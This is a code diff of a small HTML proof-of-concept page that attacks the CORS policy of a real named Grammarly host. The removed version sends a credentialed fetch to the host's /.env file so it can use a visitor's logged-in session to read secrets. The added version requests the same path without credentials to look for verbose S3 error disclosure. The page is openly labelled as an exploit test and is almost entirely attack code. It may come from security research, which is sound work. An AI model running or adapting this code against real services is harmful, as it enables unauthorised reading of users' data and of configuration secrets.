@@ -1,54 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - Grammarly Test</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        #output { background-color: #f4f4f4; padding: 20px; white-space: pre-wrap; }
-    </style>
+    <title>CORS Verbose Error PoC - Grammarly</title>
+    <style>body { font-family: Arial; margin: 40px; } #output { white-space: pre-wrap; background: #f4f4f4; padding: 20px; }</style>
 </head>
 <body>
-    <h1>CORS Exploit Test</h1>
-    <p>This page attempts to read data from <code>officeaddin.grammarly.com</code> using your logged-in session.</p>
-    <button onclick="runExploit()">Run Exploit Test</button>
+    <h2>CORS Verbose Error Test</h2>
+    <p>Testing for information disclosure via verbose S3 CORS errors.</p>
+    <button onclick="testCorsError()">Test for Verbose Error</button>
     <br><br>
     <div id="output">Results will appear here...</div>
 
     <script>
-        function runExploit() {
-            const outputDiv = document.getElementById('output');
-            outputDiv.textContent = 'Sending request...';
+        async function testCorsError() {
+            const output = document.getElementById('output');
+            output.textContent = 'Testing...';
 
-            // The target URL - Let's try the root and a common sensitive file
-            const targetUrl = 'https://officeaddin.grammarly.com/.env';
+            // Test a path that likely doesn't exist
+            const testUrl = 'https://officeaddin.grammarly.com/.env';
 
-            fetch(targetUrl, {
-                method: 'GET',
-                credentials: 'include' // CRITICAL: Sends the user's cookies with the request
-            })
-            .then(response => {
-                // Log the response headers for the report
-                let resultText = `[+] HTTP Status: ${response.status} ${response.statusText}\n`;
-                resultText += `[+] Access-Control-Allow-Origin: ${response.headers.get('Access-Control-Allow-Origin')}\n`;
-                resultText += `[+] Access-Control-Allow-Credentials: ${response.headers.get('Access-Control-Allow-Credentials')}\n`;
+            try {
+                // First, try WITHOUT credentials. We might be able to read the error body even if the origin is blocked.
+                const response = await fetch(testUrl, { 
+                    method: 'GET',
+                    // credentials: 'include' // REMOVED for this test
+                });
 
-                if (response.ok) {
-                    // If the server responds OK, try to read the text
-                    return response.text().then(data => {
-                        resultText += `\n[+] RESPONSE BODY:\n${data}`;
-                        outputDiv.textContent = resultText;
-                    });
-                } else {
-                    // If the server responds with an error (403, 404, etc.)
-                    resultText += `\n[-] Server responded with an error. The CORS policy might still be vulnerable, but the file was not found.`;
-                    outputDiv.textContent = resultText;
-                    // Even if the file isn't found, the CORS headers are the key finding.
-                }
-            })
-            .catch(error => {
-                // This is where CORS errors will appear
-                outputDiv.textContent = `[-] FETCH FAILED. This is likely due to a CORS error (the browser blocked it).\n\nError: ${error}`;
-            });
+                // If we get here, the CORS policy might actually allow our origin for errors?
+                const text = await response.text();
+                output.textContent = `SUCCESS (unlikely): Status: ${response.status}\nResponse: ${text}`;
+
+            } catch (error) {
+                // This is where we expect to be. The browser blocks us from reading the response.
+                output.textContent = `Network error (expected). The browser blocked the request.\n\nCheck the 'Network' tab in DevTools (F12). Look for the request to ${testUrl}. Click it and check the 'Response' tab for the full XML error.`;
+            }
         }
     </script>
 </body>
